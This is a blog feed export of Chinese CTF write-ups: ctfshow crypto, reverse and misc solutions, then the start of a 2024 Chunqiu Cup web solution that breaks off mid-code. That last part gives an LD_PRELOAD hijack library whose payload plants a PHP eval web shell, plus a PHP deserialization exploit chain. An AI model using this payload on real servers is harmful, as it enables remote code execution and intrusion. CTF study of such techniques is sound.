class="built_in">pow</span>(n,e,c))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e=&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d=&quot;</span>,d)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c= 48794779998818255539069127767619606491113391594501378173579539128476862598083</span></span><br><span class="line"><span class="string">hint= 7680157534215495795423318554486996424970862185001934572714615456147511225105</span></span><br><span class="line"><span class="string">e= 65537</span></span><br><span class="line"><span class="string">d= 45673813678816865674850575264609274229013439838298838024467777157494920800897</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>题目给了 <code>pow(n,e,c)</code>，已知 <code>n &gt; c</code>，那么可以先分解 <code>c</code>用rsa求出 <code>n-c</code>，从而得到 n ，后续就是直接解出flag。</p><p>c可以用在线分解网站分解。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c=<span class="number">48794779998818255539069127767619606491113391594501378173579539128476862598083</span></span><br><span class="line">hint= <span class="number">7680157534215495795423318554486996424970862185001934572714615456147511225105</span></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">d= <span class="number">45673813678816865674850575264609274229013439838298838024467777157494920800897</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">cp = <span class="number">6091</span></span><br><span class="line">cq = <span class="number">8010963716765433514869336359812774009376685535134030237002058632158407913</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d2 = gmpy2.invert(e, (cp - <span class="number">1</span>) * (cq - <span class="number">1</span>))</span><br><span class="line">n = <span class="built_in">pow</span>(hint, d2, c) + c</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;ctfshow&#123;Oh_u_knOw_4uler&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="混合密码体系"><a href="#混合密码体系" class="headerlink" title="混合密码体系"></a>混合密码体系</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 库</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,getPrime</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对称加密</span></span><br><span class="line">flag = <span class="string">b&#x27;ctfshow&#123;***&#125;&#x27;</span>      <span class="comment"># 密文，隐藏</span></span><br><span class="line">key = <span class="string">b&#x27;flag&#123;***&#125;&#x27;</span>      <span class="comment"># 会话密钥，隐藏</span></span><br><span class="line">iv = <span class="string">b&#x27;flag&#123;1fake_flag&#125;&#x27;</span>       <span class="comment"># AES偏移向量，已知</span></span><br><span class="line"><span class="comment"># 对明文进行填充，使其长度符合AES加密的要求</span></span><br><span class="line">padded_plaintext = pad(flag, AES.block_size)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建AES加密对象</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line">ciphertext = cipher.encrypt(padded_plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密后的文本通常是字节串，转成整数便于进行会话密钥的RSA加密</span></span><br><span class="line">c1 = bytes_to_long(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 非对称加密</span></span><br><span class="line">m = bytes_to_long(key)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># print(&quot;hint:key需要转成字节流也就是b&#x27;&#x27;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c1 = 10274623386006297478525964130173470046355982953419353351509177330015001060887455252482567718546651504491658563014875</span></span><br><span class="line"><span class="string">p = 126682770761631193509957156425049279522830651950325320826580754739365086374362604934854454428815835196844469535588686149210573266628767888593088817059600076401582225549728184309047483547810100015820325082976781284679340880386138390518973395696206374336712856387090369022746536868747455939074262253452873845903</span></span><br><span class="line"><span class="string">q = 99825079362327808334563489684167271427241139432727401182808888165552821217781929397837262324242177528386988701584385208395369790542025175917752058047649096340776854252623173162664426065810683048016574420043010318337693586527652970534982946701493024718805916479479658257730226388868060010370893747360166996939</span></span><br><span class="line"><span class="string">n = 12646117645119414744807511144503229609414192869007113075368323921021672404219693075011763838210400633721060798765473421092201704833591315689681668160927426685183273670665030724394172000165517517884654100267567861284096827407481978978840602383267875832034344793848710383473014512122260278131503985961857107838296047172582364612603344429943715046318283653354068887129071531081918798285138812386418361474496678248683513378861801570673376726388110813411011818940310547686977359605296489433805717348250520973842927175837164120905300831792358190183785344002217291207378744610039145999012939983693891188308725179098958690917</span></span><br><span class="line"><span class="string">c2 = 5211902378262010726785508340196935051860438587769647187076059600864676774592415052428465708887047312982844957691943180258845015420187239772414768121857728821510440178906193308448250067671679439841031484589864038401572589752057423667532898133171822921282769652197139455317095891357335645435094243006629469245881345449943250189771998449015275390517315432969774421721243965028796050948747282387052634211032729131656214346307483397410725129682422969273915759947596313513270946529649661334582775282060624547405060499311618257517792321792697831000977711752728887999320311631022598717946355057272761740061999974856808147244</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>flag用aes加密，aes的key用rsa加密。</p><p>先求出 key 再求 flag 即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c1 = <span class="number">10274623386006297478525964130173470046355982953419353351509177330015001060887455252482567718546651504491658563014875</span></span><br><span class="line">p = <span class="number">126682770761631193509957156425049279522830651950325320826580754739365086374362604934854454428815835196844469535588686149210573266628767888593088817059600076401582225549728184309047483547810100015820325082976781284679340880386138390518973395696206374336712856387090369022746536868747455939074262253452873845903</span></span><br><span class="line">q = <span class="number">99825079362327808334563489684167271427241139432727401182808888165552821217781929397837262324242177528386988701584385208395369790542025175917752058047649096340776854252623173162664426065810683048016574420043010318337693586527652970534982946701493024718805916479479658257730226388868060010370893747360166996939</span></span><br><span class="line">n = <span class="number">12646117645119414744807511144503229609414192869007113075368323921021672404219693075011763838210400633721060798765473421092201704833591315689681668160927426685183273670665030724394172000165517517884654100267567861284096827407481978978840602383267875832034344793848710383473014512122260278131503985961857107838296047172582364612603344429943715046318283653354068887129071531081918798285138812386418361474496678248683513378861801570673376726388110813411011818940310547686977359605296489433805717348250520973842927175837164120905300831792358190183785344002217291207378744610039145999012939983693891188308725179098958690917</span></span><br><span class="line">c2 = <span class="number">5211902378262010726785508340196935051860438587769647187076059600864676774592415052428465708887047312982844957691943180258845015420187239772414768121857728821510440178906193308448250067671679439841031484589864038401572589752057423667532898133171822921282769652197139455317095891357335645435094243006629469245881345449943250189771998449015275390517315432969774421721243965028796050948747282387052634211032729131656214346307483397410725129682422969273915759947596313513270946529649661334582775282060624547405060499311618257517792321792697831000977711752728887999320311631022598717946355057272761740061999974856808147244</span></span><br><span class="line">iv = <span class="string">b&#x27;flag&#123;1fake_flag&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c2, d, n)</span><br><span class="line">key = long_to_bytes(m)</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">flag = cipher.decrypt(long_to_bytes(c1))</span><br><span class="line"><span class="built_in">print</span>(unpad(flag, AES.block_size))</span><br><span class="line"><span class="comment"># b&#x27;ctfshow&#123;Hybrid_password_system_is_chaos&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="pe"><a href="#pe" class="headerlink" title="pe"></a>pe</h2><p>修复头运行即可得到flag。</p><p>把头部的 <code>ZM</code> 改成 <code>MZ</code> 即可。</p><h2 id="一个西瓜切两半你一半我一半"><a href="#一个西瓜切两半你一半我一半" class="headerlink" title="一个西瓜切两半你一半我一半"></a>一个西瓜切两半你一半我一半</h2><p>先把pyc反编译，得到源码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;ctfshow&#123;this_is_fake_flag&#125;&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;这是假的密钥&#x27;</span></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    tmp += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) - <span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line">crypt = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)):</span><br><span class="line">    crypt += <span class="built_in">chr</span>(<span class="built_in">ord</span>(tmp[i]) + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(crypt)</span><br></pre></td></tr></table></figure><p>txt文件有两行中文，猜测第一行是key，第二行是密文。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&#x27;一个西瓜切两半你一半我一半&#x27;</span></span><br><span class="line">enc = <span class="string">&quot;乃乾觅甯剏乳厡侻丨厏扝乌博丿乜规甲剌乶厝侥丿卻扚丠厘丿乎覟瓬剤&quot;</span></span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">tmp += <span class="built_in">chr</span>(<span class="built_in">ord</span>(enc[i]) - <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># ctfshow&#123;Hell0_Reverse_Qi@n_D@0&#125;</span></span><br></pre></td></tr></table></figure><h2 id="探索进制的奥秘"><a href="#探索进制的奥秘" class="headerlink" title="探索进制的奥秘"></a>探索进制的奥秘</h2><p>ida打开，shift+F12可以看到一串16进制。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/r_1_1.png"></p><p>解码即可得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTFShow&#123;Thank_CTFSHOW_Sky&#125;</span><br></pre></td></tr></table></figure><h2 id="E"><a href="#E" class="headerlink" title="E"></a>E</h2><p>ida打开，shift+F12，可以看到一个base64编码的字符串。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/r_2_1.png"></p><p>解码后即可得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Q1RGU0hPV3tKSUFNSV9TSE9XX1lBTn0=</span><br><span class="line"></span><br><span class="line">CTFSHOW&#123;JIAMI_SHOW_YAN&#125;</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="你是我的眼"><a href="#你是我的眼" class="headerlink" title="你是我的眼"></a>你是我的眼</h2><p>idea反编译jar包，可以看到一串base64，解码即可得到flag。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/m_1_1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTFShow&#123;TEST_BASE64_BIANMA&#125;</span><br></pre></td></tr></table></figure><h2 id="二维码拼图"><a href="#二维码拼图" class="headerlink" title="二维码拼图"></a>二维码拼图</h2><p>二维码拼图，一张二维码分成了九份再旋转变换，与其处理图片还不如自己画一个更快，不需要画完，画一部分直到微信能扫就行。</p><p>在线网站：<a href="https://merri.cx/qrazybox/">QRazyBox</a></p><p>先估算二维码的大小，大概数了一下，预估是41x41。</p><p>先画出右边下角，然后通过右下角找出旁边的图片，可以通过毛边去找，边缘平整说明是边缘，有毛刺说明是切割的。</p><p>把下边拼好后，可以反推出纠错码，确定好纠错级别，从而得到蓝色区域部分的像素点。</p><p>然后根据纠错码确定另外两个角，最后通过毛边确定其他部分。</p><p>中间可以不同画出来，可以扫出flag了。</p><p>最终得到以下图像，用微信扫可以得到flag。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/m_2_1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;0a9c316c-19c7-4f01-8e7c-167ebe991fd8&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> MISC </tag>
            
            <tag> CRYPTO </tag>
            
            <tag> REVERSE </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024春秋杯网络安全联赛夏季赛</title>
      <link href="/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/"/>
      <url>/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Hijack"><a href="#Hijack" class="headerlink" title="Hijack"></a>Hijack</h2><p>源码:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\)&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>);</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$pattern</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No injecting!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ENV</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$math</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$key</span>=<span class="title function_ invoke__">filter</span>(<span class="variable">$this</span>-&gt;key);</span><br><span class="line">        <span class="variable">$value</span>=<span class="title function_ invoke__">filter</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line">        <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">$key</span>=<span class="subst">$value</span>&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat hints.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;math-&gt;flag))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YesYes&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YesYesYes&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DIFF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callback</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$back</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;callback-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are stupid, what exactly is your identity?&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$enviroment</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;hacker&quot;</span>==<span class="variable language_">$this</span>-&gt;enviroment)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hacker is bad guy!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$function_name</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.[^.]*$/&#x27;</span>, <span class="variable">$this</span>-&gt;filename, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">            <span class="variable">$uploadDir</span> = <span class="string">&quot;/tmp/&quot;</span>;</span><br><span class="line">            <span class="variable">$destination</span> = <span class="variable">$uploadDir</span> . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>()) . <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$value</span>[<span class="number">0</span>]));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">rename</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$destination</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;文件成功移动到$&#123;destination&#125;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;文件移动失败。&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;非法文件名。&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FUN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun-&gt;<span class="title function_ invoke__">getflag</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Harder&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>审计代码，可以看到有 <code> putenv(&quot;$key=$value&quot;);</code>，再根据 <code>getenv(&quot;LD_PRELOAD&quot;);</code> ，可以知道是要打 <code>LD_PRELOAD</code>劫持。</p><p>先写 so 文件。</p><p>编译1.so</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">        system(<span class="string">&quot;echo \&quot;&lt;?php eval(\\$_POST[cmd]);?&gt;\&quot; &gt; /var/www/html/1.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC 1.c -o 1.so</span><br></pre></td></tr></table></figure><p>得到 1.so，然后转成 base64</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;1.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">b64 = base64.b64encode(file)</span><br><span class="line"><span class="built_in">print</span>(b64)</span><br></pre></td></tr></table></figure><p>接着是反序列化。</p><p>写 so:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file_data</span> = <span class="string">&quot;(1.so的base64编码)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ENV</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$math</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$key</span>=<span class="title function_ invoke__">filter</span>(<span class="variable">$this</span>-&gt;key);</span><br><span class="line">        <span class="variable">$value</span>=<span class="title function_ invoke__">filter</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line">        <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">$key</span>=<span class="subst">$value</span>&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat hints.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;math-&gt;flag))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YesYes&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YesYesYes&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DIFF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callback</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$back</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;callback-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are stupid, what exactly is your identity?&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$enviroment</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;hacker&quot;</span>==<span class="variable language_">$this</span>-&gt;enviroment)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hacker is bad guy!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$function_name</span>,<span 